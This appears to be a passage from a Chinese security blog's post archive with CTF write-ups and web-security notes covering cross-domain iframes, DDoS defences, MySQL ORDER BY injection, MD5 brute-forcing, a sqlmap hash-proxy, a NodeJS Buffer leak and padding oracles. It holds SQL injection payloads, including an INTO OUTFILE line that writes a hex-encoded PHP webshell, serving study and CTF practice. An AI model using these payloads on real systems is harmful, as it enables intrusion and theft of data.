data.htmlwindow.name=&quot;xxx&quot;; //可以是其他类型的数据，比如数组，对象等等 应用页面 http://www.a.com/main.html 的代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!-- main.html --&gt;var iframeData;var state = 0;//开关变量var iframe = document.createElement('iframe'); //创建iframevar loadfn = function() &#123; if (state === 1) &#123; iframeData = iframe.contentWindow.name; // 读取数据 alert('获取到了iframe传过来的妹子'+iframeData); &#125;else if (state === 0) &#123; state = 1; iframe.contentWindow.location = 'http://www.a.com/other.html'; //这里是代理页面 other.html /** 这里说明一下: 由于iframe的location改变了，相当于重新载入页面（这是iframe的性质决定的），于是重新执行loadfn方法。 由于当iframe的页面跳到其他地址时，其window.name值保持不变，并且此时开关变量 state已经变为1， 于是就可以获取到window.name值，也就达到了跨域访问的目的了。 **/ &#125;;&#125;iframe.src = 'http://www.b.com/data.html'; //这是是数据页面，data.htmlif (iframe.attachEvent) &#123; iframe.attachEvent('onload', loadfn);&#125; else &#123; iframe.onload = loadfn;&#125;document.body.appendChild(iframe); 获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）。 123iframe.contentWindow.document.write('');iframe.contentWindow.close();document.body.removeChild(iframe); WebSocketWebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>同源策略</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDoS]]></title>
    <url>%2F2017%2F03%2F25%2FDDos%2F</url>
    <content type="text"><![CDATA[攻击带宽攻击系统资源SYN Flood攻击SYN Flood攻击是当前网络上最为常见的DDos攻击，也是最为经典的拒绝服务攻击，它利用了TCP协议实现上的一个缺陷，通过向网络服务所在端口发送大量的伪造源地址的半连接请求，造成目标服务器中的半连接队列被占满，耗费CPU和内存资源，使服务器超负荷，从而阻止其他合法用户进行访问 TCP混乱数据包攻击TCP混乱数据包攻击与Syn Flood攻击类似，发送伪造源IP的TCP数据包，只不过TCP头的TCP Flags 部分是混乱的，可能是syn,ack,syn+ack,syn+rst等等，会造成一些防护设备处理错误锁死，消耗服务器CPU内存的同时还会堵塞带宽 防范措施 缩短SYN Timeout时间，及时将超时请求丢弃，释放被占用CPU和内存资源。 限制同时打开的SYN半连接数目，关闭不必要的服务。 设置SYN Cookie，给每一个请求连接的IP地址分配一个Cookie。如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，以后从这个IP地址来的包会被一概丢弃。 syn proxy, 这种技术对所有的syn包均主动回应，探测发起syn包的源IP地址是否真实存在，如果该IP地址真实存在，则该IP会回应防护设备的探测包，从而建立TCP连接。大多数的国内外抗DDOS产品均采用此类技术 Safereset技术：此技术对所有的syn包均主动回应，探测包特意构造错误的字段，真实存在的IP地址会发送rst包给防护设备，然后发起第2次连接，从而建立TCP连接 syn重传技术：该技术利用了TCP/IP协议的重传特性，来自某个源IP的第一个syn包到达时被直接丢弃并记录状态，在该源IP的第2个syn包到达时进行验证，然后放行 攻击应用资源TCP全连接攻击这种攻击是为了绕过常规防火墙的检查而设计的，针对用户态运行的tcp服务器。一般情况下，常规防火墙大多具备syn cookies或者syn proxy能力，能够有效应对伪造的IP攻击，但对于正常的TCP连接是放过的。但殊不知很多网络服务程序能接受的TCP连接数是有限的，一旦有大量的 TCP连接，即便是正常的，也会导致网站访问非常缓慢甚至无法访问，正所谓“多情总被无情伤”。TCP全连接攻击就是通过许多僵尸主机不断地与受害服务器建立大量的TCP连接，直到服务器的内存等资源被耗尽而被拖跨，从而造成拒绝服务，这种攻击的特点是可绕过一般防火墙的防护而达到攻击目的。 UDP Flood攻击常见的情况是利用大量UDP小包冲击DNS服务器或Radius认证服务器、流媒体视频服务器。 100k PPS的UDP Flood经常将线路上的骨干设备例如防火墙打瘫，造成整个网段的瘫痪。由于UDP协议是一种无连接的服务，在UDP FLOOD攻击中，攻击者可发送大量伪造源IP地址的小UDP包。但是，由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。 DNS Flood攻击UDP DNS Query Flood攻击实质上是UDP Flood的一种，但是由于DNS服务器的不可替代的关键作用，一旦服务器瘫痪，影响一般都很大。UDP DNS Query Flood攻击采用的方法是向被攻击的服务器发送大量的域名解析请求，通常请求解析的域名是随机生成或者是网络世界上根本不存在的域名，被攻击的DNS 服务器在接收到域名解析请求的时候首先会在服务器上查找是否有对应的缓存，如果查找不到并且该域名无法直接由服务器解析的时候，DNS 服务器会向其上层DNS服务器递归查询域名信息。 防范对突然发起大量频度较低的域名解析请求的源 IP 地址进行带宽限制，在攻击发生时降低很少发起域名解析请求的源IP地址的优先级，限制每个源 IP 地址每秒的域名解析请求次数 攻击web服务器CC攻击CC攻击(Challenge Collapsar)是DDOS攻击的一种，是利用不断对网站发送连接请求致使形成拒绝服务的攻击。相比其它的DDOS攻击，CC攻击是应用层的，主要针对网站。CC主要是用来攻击页面的，CC就是模拟多个用户(少线程就是多少用户)不停地进行访问那些需要大量数据操作(就是需要大量CPU时间)的页面，造成服务器资源的浪费，CPU长时间处于100%，永远都有处理不完的连接直至就网络拥塞，正常的访问被中止。 这种攻击主要是针对存在ASP、JSP、php、CGI等脚本程序，并调用mssql Server、mysqlServer、Oracle等数据库的网站系统而设计的，特征是和服务器建立正常的TCP连接，并不断的向脚本程序提交查询、列表等大量耗费数据库资源的调用，典型的以小博大的攻击方法。这种攻击的特点是可以完全绕过普通的防火墙防护，轻松找一些Proxy代理就可实施攻击，缺点是对付只有静态页面的网站效果会大打折扣。 防范对是否HTTP Get的判断，要统计到达每个服务器的每秒钟的GET请求数，如果远远超过正常值，就要对HTTP协议解码，找出HTTP Get及其参数(例如URL等)。然后判断某个GET 请求是来自代理服务器还是恶意请求，并回应一个带Key的响应要求，请求发起端作出相应的回馈。如果发起端不响应则说明是利用工具发起的请求，这样HTTP Get请求就无法到达服务器，达到防护的效果。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>DDoS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在线编程]]></title>
    <url>%2F2017%2F03%2F24%2F%E5%9C%A8%E7%BA%BF%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[C++输入在线编程输入输出很关键，特别是输入，输入读数据的方式不对，连测试样例都读不进来，功能实现了，也还是通不过，这里列举一些碰到的例子，慢慢总结。 cin cin &gt;&gt; a &gt;&gt; b;, &gt;&gt; 是会过滤掉不可见字符（如 空格 回车，TAB 等); 不想略过空白字符，那就使用 noskipws 流控制 cin&gt;&gt;noskipws&gt;&gt;input[j]; cin.get() 可以用来接收字符, 或字符串(可以接受空格) 123456789101112#include &lt;iostream&gt;using namespace std;main ()&#123;char ch;//或者cin.get(ch);ch=cin.get();cout&lt;&lt;ch&lt;&lt;endl;&#125;输入：jljkljkl输出：j 1234567891011#include &lt;iostream&gt;using namespace std;main ()&#123;char a[20];cin.get(a,20);cout&lt;&lt;a&lt;&lt;endl;&#125;输入：jkl jkl jkl输出：jkl jkl jkl cin.getline() getline (char* s, streamsize n, char delim ); 接受一个字符串，可以接收空格并输出 1234567891011#include &lt;iostream&gt;using namespace std;main ()&#123;char m[20];cin.getline(m,5);cout&lt;&lt;m&lt;&lt;endl;&#125;输入：jkljkljkl输出：jklj getline getline (istream&amp; is, string&amp; str, char delim); 需包含“#include &lt;string&gt;”, 接受一个字符串，可以接收空格并输出 123456789101112#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;main ()&#123;string str;getline(cin,str);cout&lt;&lt;str&lt;&lt;endl;&#125;输入：jkljkljkl输出：jkljkljkl 每行一个数据每行一个数据可以用cin读取，cin读取的是一行的内容，而且还可以指定数据格式 1234567input:123int a, b, c;cin &gt;&gt; q &gt;&gt; b &gt;&gt; c; 输入数据用 , 分隔这种情况下并不能用cin读数据。 方式一: 使用getline 123456input:123,234string a, b;getline(cin, a, &apos;,&apos;);getline(cin, b); 字符串操作逆序 reverse() 12345678910#include &lt;algorithm&gt;#include &lt;string&gt;string a;cin &gt;&gt; a;reverse(a.begin(), a.end());cout &lt;&lt; a &lt;&lt; endl;输入：123输出：321 类型转换 数字转字符串 12345#include &lt;string&gt;int a;string sa;sa = to_string(a); 字符串转数字 12345#include &lt;string&gt;int a;string sa;a = stoi(sa);]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>在线编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL注入系列之order by 注入(二)]]></title>
    <url>%2F2017%2F03%2F22%2FMySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8Border-by-%E6%B3%A8%E5%85%A5-%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[order by 基础知识ORDER BY {col_name | expr | position}, order by 后面可以跟字段名，表达式和字段的位置，字段的位置需要是整数型。 实验环境本地搭建 sqli-lab 环境，选取lesson-52作为盲注测试目标 lesson-52 核心代码 12345$id=$_GET['sort']; if(isset($id))&#123; ... $sql="SELECT * FROM users ORDER BY $id"; 使用asc和desc关键词测试是否为order by 注入，根据下面结果可以得知注入点为order by注入 order by 注入基于 order by 的注入有盲注和报错注入 order by 盲注需要知道字段名需要字段名的情况通常是，执行了查询语句，然后根据查询结果排序的差别进行盲注 使用 if(1&lt;2, id, username)或者类似的表达式来布尔盲注或者时间盲注 条件判断之后需要选择字段名，如: id，username，而不能是1，2等表示字段的位置的数字，因为1，2会被判断为字符返回，而不是整数类型，所以必须知道字段名。 123case when (true) then id else username endif((select ascii(substr(table_name,1,1)) from information_schema.tables limit 1)&lt;=128,id,username) 不需要知道字段名 引起mysql错误进行盲注 12if(1=0,1,(select 1 from information_schema.tables))case when(2&lt;1) then 1 else 1*(select 1 from information_schema.tables)end)=1 条件为false是，值为select 1 from information_schema.tables，mysql会报错: Subquery returns more than 1 row, 导致查询结果为空. 这样就可以根据查询结果是否为空，判断条件的真假 基于时间的盲注 1if(1,sleep(3),1) 基于rand()的盲注 order by rand(true); order by rand(false); 返回不同进行盲注。原理是 order by rand()会随机给每个数据生成一个随机数，然后按照随机数排序，true和false实际上转成了整形的1和0作为rand()的种子，这样给每一列都会成一个固定的数，然后根据这个数来排序，所以结果会不同。 1rand(ascii(mid(database(),1,1))=109) order by 报错注入procedure 存储过程 支持报错 本地测试没成功，可能和mysql版本有关 12mysql&gt; SELECT 1 from mysql.user order by 1 limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);ERROR 1105 (HY000): XPATH syntax error: &apos;:5.1.73-log&apos; 不支持报错，用time-based 12mysql&gt; SELECT 1 from mysql.user order by 1 limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(50000000,SHA1(1)),1))))),1);ERROR 1105 (HY000): XPATH syntax error: &apos;:0&apos; GETSHELL： 12mysql&gt; SELECT 1 from mysql.user order by 1 limit 0,1 into outfile &apos;/tmp/2.php&apos; LINES TERMINATED BY 0x3C3F7068702061737365727428245F504F53545B70765D293B3F3E;Query OK, 1 row affected (0.00 sec)]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>MySQL注入</tag>
        <tag>order by</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【CTF】MD5截断比较]]></title>
    <url>%2F2017%2F03%2F21%2F%E3%80%90CTF%E3%80%91MD5%E6%88%AA%E6%96%AD%E6%AF%94%E8%BE%83%2F</url>
    <content type="text"><![CDATA[md5 截断验证ctf中经常用MD5的截断比较做验证，如:substr(md5($str), 0, 6) === &quot;3322cf&quot;,通过这种方式限制脚本的自动化攻击。 通常可以写脚本去爆破MD5, 但是花费时间和比较字符串的长度有关，并且花费时间通常比较长，这不利于脚本自动攻击，下面给出爆破脚本和使用方式。 submd5.py 1234567891011121314151617181920212223242526272829303132333435363738394041# -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len, start=0, size=20): global CHARS while not stop_event.is_set(): rnds = ''.join(random.choice(CHARS) for _ in range(size)) md5 = hashlib.md5(rnds) if md5.hexdigest()[start: start+str_len] == substr: print rnds stop_event.set()if __name__ == '__main__': substr = sys.argv[1].strip() start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0 str_len = len(substr) cpus = multiprocessing.cpu_count() stop_event = multiprocessing.Event() processes = [multiprocessing.Process(target=cmp_md5, args=(substr, stop_event, str_len, start_pos)) for i in range(cpus)] for p in processes: p.start() for p in processes: p.join() 用法: 12345$ python submd5.py &quot;3d4f4&quot;SponhjOhIZ30IaM1fweb$ python submd5.py &quot;3df4&quot; 2G8tr6VhonA1z3xJdaGBu 想要在较短时间内获得可用的md5,可以使用彩虹表类似的方式去实现，通过空间去换时间。 生成md5文件，并排序: gen_md5.py 12345678910111213# -*- coding: utf-8 -*-import itertoolsimport hashlibimport stringCHARS = string.letters + string.digitsstr_len = 8for s in itertools.product(CHARS, repeat=str_len): s = ''.join(s) print "&#123;0&#125; &#123;1&#125;".format(hashlib.md5(s).hexdigest(), s) 命令行排序: python gen_md5.py | sort -o md5_sorted.txt md5 文件搜索(二分查找): match.py 123456789101112131415161718192021222324252627282930313233343536373839# -*- coding: utf-8 -*-import itertoolsimport hashlibimport stringimport osdef match(s): md5_file = "md5_sorted.txt" byte_size = os.path.getsize(md5_file) with open(md5_file, 'rb') as f: line_len = len(f.readline()) print line_len with open(md5_file, "rb") as f: L = 0 R = byte_size / line_len - 1 while R - L &gt; 0: C = L + (R - L) / 2 offset = C * line_len f.seek(offset) ln = f.read(line_len).strip() #print ln head = ln[:len(s)] if s == head: return ln.split(" ")[1] if s &lt; head: R = C continue L = C return# print match('fef')]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>md5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[requests手动修改Content-Length头]]></title>
    <url>%2F2017%2F03%2F21%2Frequests%E6%89%8B%E5%8A%A8%E4%BF%AE%E6%94%B9Content-Length%E5%A4%B4%2F</url>
    <content type="text"><![CDATA[requests发送前修改请求信息requests可以再发送请求前，修改请求信息，见Prepared Requests 例如发送前手动修改请求头Content-Length 123456789101112from requests import Request, Sessions = Session()req = Request('POST', url, data=data, headers=headers)prepped = req.prepare()# do something with prepped.headersprepped.headers['Content-Length'] = your_custom_content_length_calculation()# prepped.headers['Content-Length'] = '1000000000'resp = s.send(prepped) 如果session有自己的配置，如cookie等，应该使用s.prepare_request(req), 而不是req.prepare()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>requests</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL注入系列之基础知识(一)]]></title>
    <url>%2F2017%2F03%2F19%2FMySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E4%B8%80%2F</url>
    <content type="text"><![CDATA[select 语法1234567891011121314151617181920SELECT[ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]select_expr [, select_expr ...][FROM table_references[WHERE where_condition][GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]][HAVING where_condition][ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...][LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;][PROCEDURE procedure_name(argument_list)][INTO OUTFILE &apos;file_name&apos; export_options | INTO DUMPFILE &apos;file_name&apos; | INTO var_name [, var_name]][FOR UPDATE | LOCK IN SHARE MODE]] 基础函数doc mysql 5.7 string-functions 函数 功能 备注 concat 返回连接参数产生的字符串 如果其中一个参数为null，则返回值为null concat_ws 返回连接参数产生的字符串 CONCAT_WS(sp,s1,…) 第一个参数是分隔符，剩下的参数就是字段名 group_concat 合并多条记录中的结果 if if(exp1,exp2,exp2) exp1的表达式是True，返回exp2；否则返回exp3 case exists length 返回字符串的长度 substr 截断字符串 substr(str,pos,length) pos是从1开始 mid mid(string, start, length) left left(string, n) ord 返回字符的ASCII码 ascii 返回字符的ascii值 char hex 返回字符串的16进制 unhex 返回字符串 abs if if(expr1, expr2, expr2) mysql 5.7 doc: IF() returns a numeric or string value, depending on the context in which it is used. IF() 函数根据其上下文决定返回 数字 或 字符串 类型的数据. 如果 expr2 或 expr3 中有一个类型为 NULL, 那么 IF() 函数的返回类型是另外一个非 NULL 表达式的类型. IF() 默认返回值类型评定规则: 表达式 返回值类型 expr2 或 expr3 返回字符串 字符串 expr2 或 expr3 返回浮点数 浮点数 expr2 或 expr3 返回整型 整型 当 expr2 或 expr3 都是字符串时, 如果他们之中有一个是字符大小写敏感的, 那么返回类型也是大小写敏感的 mysql 常用过滤函数mysql安全配置]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>MySQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap代理绕过参数hash验证]]></title>
    <url>%2F2017%2F03%2F19%2Fsqlmap%E4%BB%A3%E7%90%86%E7%BB%95%E8%BF%87%E5%8F%82%E6%95%B0hash%E9%AA%8C%E8%AF%81%2F</url>
    <content type="text"><![CDATA[背景介绍前端js对用户输入的参数进行加密，然后发送给服务器，服务器先验证合法性，然后才处理用户传入的参数，返回响应。这种方式并没有看起来的那么可靠，完全依赖前端的加密，服务器仅仅只进行验证工作，这是很不安全的，用户只需分析清楚前端的加密方式，然后利用这种加密方式加密数据，就可以伪造数据通过服务器的验证。 2017 0CTF一道Web题KoG就是这种情况, 前端js首先会验证用户输入的合法性，对合法的输入进行加密，服务端进行验证。若想绕过js的验证，可以通过更改js的代码，或者分析清楚js的加密方式，然后利用加密方式伪造数据。 js加密方式解析发送真正请求的方式为: 1var s = "api.php?id=" + args["id"] + "&amp;hash=" + ar[0] + "&amp;time=" + ar[1]; 关键是hash内部是怎么加密的。对前端js进行调试，发现其加密方式为: 1md5(d727d11f6d284a0d + id + This_is_salt + time) 知道了hash加密的方式, 服务器根据id和time验证hash值是否正确，id为用户输入，关键看time服务器是否会验证，若time值服务器不验证则很容易伪造hash值，若服务器验证time,则需要知道time值是怎样来的，然后每次都要更新time值，所幸服务器没有验证time值，因此hash值是可以控制的了，剩下的就是对id的注入。 id注入说到sql注入，自然想到神器sqlmap，由于服务器进行了hash校验，直接使用sqlmap时不行的，那就写个代理服务器，对sqlmap每次注入的payload进行加密，然后再发送出去，这样就可以运用sqlmap的自动化能力了 proxy.py 1234567891011121314151617181920212223242526272829303132333435363738394041# -*- coding: utf-8 -*-import sysfrom hashlib import md5from flask import Flaskfrom flask import requestimport requestsapp = Flask(__name__)def gen_hash(pid): data = "d727d11f6d284a0d&#123;&#125; This_is_salt1489821845".format(pid) return md5(data).hexdigest()def get(pid): params = &#123; 'id': '', 'hash': '', 'time': '1489821845' &#125; url = 'http://202.120.7.213:11181/api.php' params['id'] = pid params['hash'] = gen_hash(pid) resp = requests.get(url, params=params) return resp.content@app.route('/')def index(): pid = request.args['id'] return get(pid)if __name__ == "__main__": app.run(debug=True) 运行代理服务器，再调用sqlmap: sqlmap -u &#39;http://127.0.0.1:5000/?id=1&#39; -p id --dbms=mysql --dump 12345678910111213141516171819202122232425Database: 0ctfTable: fl4g[1 entry]+---------------------------------+| hey |+---------------------------------+| flag&#123;emScripten_is_Cut3_right?&#125; |+---------------------------------+[16:18:36] [INFO] table &apos;`0ctf`.fl4g&apos; dumped to CSV file &apos;/Users/js/.sqlmap/output/127.0.0.1/dump/0ctf/fl4g.csv&apos;[16:18:36] [INFO] fetching columns for table &apos;user&apos; in database &apos;0ctf&apos;[16:18:36] [INFO] fetching entries for table &apos;user&apos; in database &apos;0ctf&apos;[16:18:36] [INFO] analyzing table dump for possible password hashesDatabase: 0ctfTable: user[5 entries]+----+----------------+| id | name |+----+----------------+| 1 | EaseSingle Qin || 2 | Short 5alt || 3 | Married Ma || 4 | Hansome Chen || 5 | President Liu |+----+----------------+]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
        <tag>0CTF</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web安全简记]]></title>
    <url>%2F2017%2F03%2F17%2Fweb%E5%AE%89%E5%85%A8%E7%AE%80%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Web安全 安全的本质是信任问题 安全三要素：机密性, 完整性, 可用性 安全评估：资产等级划分 -&gt; 威胁分析 -&gt; 风险分析 -&gt; 确认解决方案 基本原则：默认安全原则，最小权限原则，纵深防御原则，数据代码分离原则，不可预测性原则 OWASP top 10(2013) A1 - 注入 A2 -失效的身份认证和会话管理 A3 -跨站脚本(XSS) A4 - 不安全的直接对象引用 A5 -安全配置错误 A6 -敏感信息泄漏 A7 - 功能级访问控制缺失 A8 -跨站请求伪造 (CSRF) A9 - 使用含有已知漏洞的组件 A10 - 未验证的重定向和转发 漏洞修补流程 建立类似bugstracker 的漏洞跟踪机制，并为漏洞的紧急程度选择优先级 建立漏洞分析机制，并与程序员一起制定修补方案，同时review补丁的代码实现 对曾经出现的漏洞进行归档，并定期统计漏洞修补方案 DoS 和 DDosDoS(Denial of Service)，即拒绝服务，造成远程服务器拒绝服务的行为被称为DoS攻击。其目的是使计算机或网络无法提供正常的服务。常见的DoS攻击: 计算机网络带宽攻击 和 连通性攻击。 攻击者伪造ACK数据包，发送大量的半连接请求防范方式： 缩短SYN Timeout时间，及时将超时请求丢弃，释放被占用CPU和内存资源。 限制同时打开的SYN半连接数目，关闭不必要的服务。 设置SYN Cookie，给每一个请求连接的IP地址分配一个Cookie。如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，以后从这个IP地址来的包会被一概丢弃 DDoS(Distributed Denial of Service，分布式拒绝服务)DoS攻击的一种方法。攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。 防范： 反欺骗：对数据包的地址及端口的正确性进行验证，同时进行反向探测 协议栈行为模式分析：每个数据包类型需要符合RFC规定，这就好像每个数据包都要有完整规范的着装，只要不符合规范，就自动识别并将其过滤掉 特定应用防护：非法流量总是有一些特定特征的 带宽控制：真实的访问数据过大时，可以限制其最大输出的流量，以减少下游网络系统的压力 CSRF防范 验证码 Referer Check，非主要手段，可作为监控手段 Anti CSRF Token，多页面共存token问题]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【CTF】NodeJS Buffer()引发内存泄露]]></title>
    <url>%2F2017%2F03%2F16%2F%E3%80%90CTF%E3%80%91Nodejs-Buffer-%E5%BC%95%E5%8F%91%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%2F</url>
    <content type="text"><![CDATA[背景介绍参加2017 NJCTF比赛时碰见了一道NodeJS的web题，之前也没学过NodeJS, 于是上网搜了一下，搜到了原题 https://www.smrrd.de/nodejs-hacking-challenge-writeup.html, 发现NJCTF在原题基础上改了入口代码，虽说在github上能搜到改过的原题，倒不如直接给源码来的痛快，这里就不提改过的题目了，直接分析原题，其中有几个点还是值得好好学习的。 环境搭建安装好nodejs的环境，切换到源码更目录，安装依赖包npm install, 运行npm start run, 然后访问本机http://localhost:3000. 关键点分析 post 请求 /admin 页面提交password，会向/login发送一个JSON类型的数据。 而NJCTF的题目更改了发送请求，直接发送的POST的数据(e.g. “password=…”)，可以通过代理工具，更改发送请求类型，发送JSON类型的数据，以后做测试时要考虑服务器是否接受发送JSON类型的请求，如果接受，可以很好的扩大发送数据的类型。 服务器响应头返回Cookie设置session和session.sig，而session明显是base64编码过，解码为{&quot;admin&quot;:&quot;no&quot;}，由于有session.sig的校验，单纯改session的值是无效的，要实现成功伪造session值，必须获得config.js配置的session_keys的值，然后本地搭建，获取session.sig. 内存泄露session_keys 12345678910111213router.post(&apos;/login&apos;, function(req, res, next) &#123; if(req.body.password !== undefined) &#123; var password = new Buffer(req.body.password); if(password.toString(&apos;base64&apos;) == config.secret_password) &#123; req.session.admin = &apos;yes&apos;; res.json(&#123;&apos;status&apos;: &apos;ok&apos; &#125;); &#125; else &#123; res.json(&#123;&apos;status&apos;: &apos;error&apos;, &apos;error&apos;: &apos;password wrong: &apos;+password.toString() &#125;); &#125; &#125; else &#123; res.json(&#123;&apos;status&apos;: &apos;error&apos;, &apos;error&apos;: &apos;password missing&apos; &#125;); &#125;&#125;); index.js中根据用户提交的password生成新的Buffer对象，当password为字符串类型时，会生成同等大小的内存块，而当password为数字类型时，则生成指定大小的内存块， 而且Buffer返回的并不是全是0的内存块，而是之前在堆上分配的数据，这样就可以泄露内存数据，获取源码和数据。 12345678&gt; Buffer(&apos;AAAA&apos;)&lt;Buffer 41 41 41 41&gt;&gt; Buffer(4)&lt;Buffer 90 4e 80 01&gt;&gt; Buffer(4)&lt;Buffer 50 cc 02 02&gt;&gt; Buffer(4)&lt;Buffer 0a 00 00 00&gt; 令password=100(整数，也可以是更大的数，泄露出更多的数据), 多次重复发送post请求，会泄露出想要的session_keys: ALLES{session_key_K.GKQeR0JS2b9OhwSH#UdMhL4EddxeD?} 123456789101112131415curl http://xxx.xxx.xxxx.xxx:3000/login -X POST -H &quot;Content-Type: application/json&quot; --data &quot;&#123;\&quot;password\&quot;: 100&#125;&quot; | hexdump -C00000000 7b 22 73 74 61 74 75 73 22 3a 22 65 72 72 6f 72 |&#123;&quot;status&quot;:&quot;error|00000010 22 2c 22 65 72 72 6f 72 22 3a 22 70 61 73 73 77 |&quot;,&quot;error&quot;:&quot;passw|00000020 6f 72 64 20 77 72 6f 6e 67 3a 20 41 4c 4c 45 53 |ord wrong: ALLES|00000030 7b 73 65 73 73 69 6f 6e 5f 6b 65 79 5f 4b 2e 47 |&#123;session_key_K.G|00000040 4b 51 65 52 30 4a 53 32 62 39 4f 68 77 53 48 23 |KQeR0JS2b9OhwSH#|00000050 55 64 4d 68 4c 34 45 64 64 78 65 44 3f 7d 72 64 |UdMhL4EddxeD?&#125;rd|00000060 41 70 70 7b 5c 22 61 64 6d 69 6e 5c 22 3a 5c 22 |App&#123;\&quot;admin\&quot;:\&quot;|00000070 6e 6f 5c 22 7d 3e 69 3c 21 44 4f 43 54 59 50 45 |no\&quot;&#125;&gt;i&lt;!DOCTYPE|00000080 20 68 74 6d 6c 3e 3c 68 74 6d 6c 20 6e 67 2d 61 | html&gt;&lt;html ng-a|00000090 70 70 3d 22 7d |pp=&quot;&#125;|00000095curl http://xxx.xxx.xxx.xxx:3000/login -X POST -H &quot;Content-Type: application/json&quot; --data &quot;&#123;\&quot;password\&quot;: 100&#125;&quot; | grep ALLES&#123;&quot;status&quot;:&quot;error&quot;,&quot;error&quot;:&quot;password wrong: ALLES&#123;session_key_K.GKQeR0JS2b9OhwSH#UdMhL4EddxeD?&#125;&gt;&lt;lin&#123;\&quot;admin\&quot;:\&quot;no\&quot;&#125;eet\&quot; href=\&quot;/stylesheets/style.&quot;&#125; 于是本地搭建环境，更改conf.js的session_keys, 然后更改app.js,强制令req.session.admin = &#39;yes&#39;, 就可以获取了有效的session和session.sig. 1234567app.use(function(req, res, next) &#123; req.session.admin = &apos;yes&apos;; // if(req.session.admin === undefined) &#123; // req.session.admin = &apos;no&apos;; // &#125; next();&#125;); 伪造cookie访问目标网站即可。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>NodeJS</tag>
        <tag>内存泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NJCTF Padding Oracle攻击利用]]></title>
    <url>%2F2017%2F03%2F12%2FNJCTF-Padding-Oracle%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[简要介绍刚好最近迷上了Web中的密码学攻击利用，才弄完CBC模式下的比特翻转攻击，不想立马就在CTF中碰见了Padding Oracle攻击，刚好还没学，正好学习一波，还不用自己找环境，源码审计，不用开脑洞~~ 题目: Be admin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130&lt;?phperror_reporting(0);define("SECRET_KEY", "......");define("METHOD", "aes-128-cbc");session_start();function get_random_token()&#123; $random_token=''; for($i=0;$i&lt;16;$i++)&#123; $random_token.=chr(rand(1,255)); &#125; return $random_token;&#125;function get_identity()&#123; global $defaultId; $j = $defaultId; $token = get_random_token(); // IV $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token); $_SESSION['id'] = base64_encode($c); setcookie("ID", base64_encode($c)); setcookie("token", base64_encode($token)); if ($j === 'admin') &#123; $_SESSION['isadmin'] = true; &#125; else $_SESSION['isadmin'] = false;&#125;function test_identity()&#123; if (!isset($_COOKIE["token"])) return array(); if (isset($_SESSION['id'])) &#123; $c = base64_decode($_SESSION['id']); if ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE["token"]))) &#123; if ($u === 'admin') &#123; $_SESSION['isadmin'] = true; &#125; else $_SESSION['isadmin'] = false; &#125; else &#123; die("ERROR!"); &#125; &#125;&#125;function login($encrypted_pass, $pass)&#123; $encrypted_pass = base64_decode($encrypted_pass); $iv = substr($encrypted_pass, 0, 16); $cipher = substr($encrypted_pass, 16); 